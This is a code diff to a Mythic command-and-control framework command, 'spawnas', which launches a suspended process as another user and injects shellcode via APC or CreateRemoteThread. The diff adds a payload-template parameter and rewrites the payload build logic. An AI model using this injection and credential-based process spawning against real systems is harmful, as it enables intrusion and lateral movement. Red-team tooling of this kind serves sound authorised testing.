@@ -1,5 +1,6 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
+import asyncio
 import json
 
 
@@ -7,6 +8,18 @@ class SpawnAsArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
         self.args = [
+            CommandParameter(
+                name="uuid",
+                cli_name="Payload",
+                display_name="Payload Template (Shellcode)",
+                type=ParameterType.Payload,
+                supported_agents=["poopsie"],
+                supported_agent_build_parameters={"poopsie": {"output_type": "Shellcode"}},
+                parameter_group_info=[
+                    ParameterGroupInfo(required=True, ui_position=1, group_name="credential_store"),
+                    ParameterGroupInfo(required=True, ui_position=1, group_name="manual"),
+                ],
+            ),
             CommandParameter(
                 name="credential",
                 cli_name="Credential",
@@ -16,7 +29,7 @@ class SpawnAsArguments(TaskArguments):
                 parameter_group_info=[ParameterGroupInfo(
                     group_name="credential_store",
                     required=True,
-                    ui_position=1
+                    ui_position=2
                 )]
             ),
             CommandParameter(
@@ -28,7 +41,7 @@ class SpawnAsArguments(TaskArguments):
                 parameter_group_info=[ParameterGroupInfo(
                     group_name="manual",
                     required=True,
-                    ui_position=1
+                    ui_position=2
                 )]
             ),
             CommandParameter(
@@ -40,7 +53,7 @@ class SpawnAsArguments(TaskArguments):
                 parameter_group_info=[ParameterGroupInfo(
                     group_name="manual",
                     required=True,
-                    ui_position=2
+                    ui_position=3
                 )]
             ),
             CommandParameter(
@@ -51,8 +64,8 @@ class SpawnAsArguments(TaskArguments):
                 description="Domain name (use '.' for local)",
                 default_value=".",
                 parameter_group_info=[
-                    ParameterGroupInfo(group_name="credential_store", ui_position=2),
-                    ParameterGroupInfo(group_name="manual", ui_position=3),
+                    ParameterGroupInfo(group_name="credential_store", ui_position=3),
+                    ParameterGroupInfo(group_name="manual", ui_position=4),
                 ]
             ),
             CommandParameter(
@@ -64,8 +77,8 @@ class SpawnAsArguments(TaskArguments):
                 choices=["apc", "createremotethread"],
                 description="Injection technique to use.",
                 parameter_group_info=[
-                    ParameterGroupInfo(group_name="credential_store", required=True, ui_position=3),
-                    ParameterGroupInfo(group_name="manual", required=True, ui_position=4),
+                    ParameterGroupInfo(group_name="credential_store", required=True, ui_position=4),
+                    ParameterGroupInfo(group_name="manual", required=True, ui_position=5),
                 ]
             ),
             CommandParameter(
@@ -76,8 +89,8 @@ class SpawnAsArguments(TaskArguments):
                 description="Use LOGON_NETCREDENTIALS_ONLY (credentials for network access only)",
                 default_value=False,
                 parameter_group_info=[
-                    ParameterGroupInfo(group_name="credential_store", ui_position=4),
-                    ParameterGroupInfo(group_name="manual", ui_position=5),
+                    ParameterGroupInfo(group_name="credential_store", ui_position=5),
+                    ParameterGroupInfo(group_name="manual", ui_position=6),
                 ]
             ),
         ]
@@ -100,9 +113,9 @@ class SpawnAsArguments(TaskArguments):
 class SpawnAsCommand(CommandBase):
     cmd = "spawnas"
     needs_admin = False
-    help_cmd = "spawnas"
-    description = "Spawn a new callback as another user. Creates a suspended process as the specified user using CreateProcessWithLogonW and injects the payload."
-    version = 1
+    help_cmd = "spawnas (modal popup)"
+    description = "Spawn a new callback as another user. Creates a suspended process as the specified user using CreateProcessWithLogonW and injects the payload. The payload template must be shellcode."
+    version = 2
     author = "@haha150"
     argument_class = SpawnAsArguments
     attackmapping = ["T1055", "T1134"]
@@ -116,54 +129,52 @@ class SpawnAsCommand(CommandBase):
             Success=True,
         )
 
-        # Build a new shellcode payload from the current callback's registered payload
-        build_resp = await SendMythicRPCPayloadCreateFromUUID(
-            MythicRPCPayloadCreateFromUUIDMessage(
-                TaskID=taskData.Task.ID,
-                PayloadUUID=taskData.Callback.RegisteredPayloadUUID,
-                NewDescription=f"SpawnAs payload - {taskData.Task.ID}",
-                NewFilename="spawnas.bin",
+        payload_search = await SendMythicRPCPayloadSearch(
+            MythicRPCPayloadSearchMessage(
+                CallbackID=taskData.Callback.ID,
+                PayloadUUID=taskData.args.get_arg("uuid"),
             )
         )
 
-        if not build_resp.Success:
-            raise Exception(f"Failed to build spawnas payload: {build_resp.Error}")
-
-        # Wait for the payload to finish building
-        while True:
-            import asyncio
-            await asyncio.sleep(2)
-            search_resp = await SendMythicRPCPayloadSearch(
-                MythicRPCPayloadSearchMessage(
-                    PayloadUUID=build_resp.NewPayloadUUID,
-                )
+        newPayloadResp = await SendMythicRPCPayloadCreateFromUUID(
+            MythicRPCPayloadCreateFromUUIDMessage(
+                TaskID=taskData.Task.ID,
+                PayloadUUID=taskData.args.get_arg("uuid"),
+                NewDescription="{}'s spawnas session from task {}".format(
+                    taskData.Task.OperatorUsername, str(taskData.Task.DisplayID)
+                ),
             )
-            if not search_resp.Success:
-                raise Exception(f"Failed to search for payload: {search_resp.Error}")
-            
-            if len(search_resp.Payloads) == 0:
-                raise Exception("Payload not found after creation")
-            
-            payload = search_resp.Payloads[0]
-            if payload.BuildPhase == "success":
-                file_resp = await SendMythicRPCFileSearch(
-                    MythicRPCFileSearchMessage(
-                        TaskID=taskData.Task.ID,
-                        PayloadUUID=build_resp.NewPayloadUUID,
+        )
+
+        if newPayloadResp.Success:
+            while True:
+                resp = await SendMythicRPCPayloadSearch(
+                    MythicRPCPayloadSearchMessage(
+                        PayloadUUID=newPayloadResp.NewPayloadUUID,
                     )
                 )
-                if not file_resp.Success or len(file_resp.Files) == 0:
-                    raise Exception("Failed to find built payload file")
-                
-                taskData.args.add_arg("uuid", file_resp.Files[0].AgentFileId)
-                break
-            elif payload.BuildPhase == "error":
-                raise Exception(f"Payload build failed: {payload.Error}")
+                if resp.Success:
+                    if resp.Payloads[0].BuildPhase == "success":
+                        taskData.args.add_arg("uuid", resp.Payloads[0].AgentFileId)
+                        username = taskData.args.get_arg("username")
+                        domain = taskData.args.get_arg("domain")
+                        technique = taskData.args.get_arg("technique")
+                        response.DisplayParams = "as {}\\{} via {} from '{}'".format(
+                            domain, username, technique,
+                            payload_search.Payloads[0].Description if payload_search.Success and len(payload_search.Payloads) > 0 else "unknown"
+                        )
+                        break
+                    elif resp.Payloads[0].BuildPhase == "error":
+                        raise Exception("Failed to build new payload")
+                    elif resp.Payloads[0].BuildPhase == "building":
+                        await asyncio.sleep(2)
+                    else:
+                        raise Exception(resp.Payloads[0].BuildPhase)
+                else:
+                    raise Exception(resp.Error)
+        else:
+            raise Exception("Failed to start build process")
 
-        username = taskData.args.get_arg("username")
-        domain = taskData.args.get_arg("domain")
-        technique = taskData.args.get_arg("technique")
-        response.DisplayParams = f"as {domain}\\{username} via {technique}"
         return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
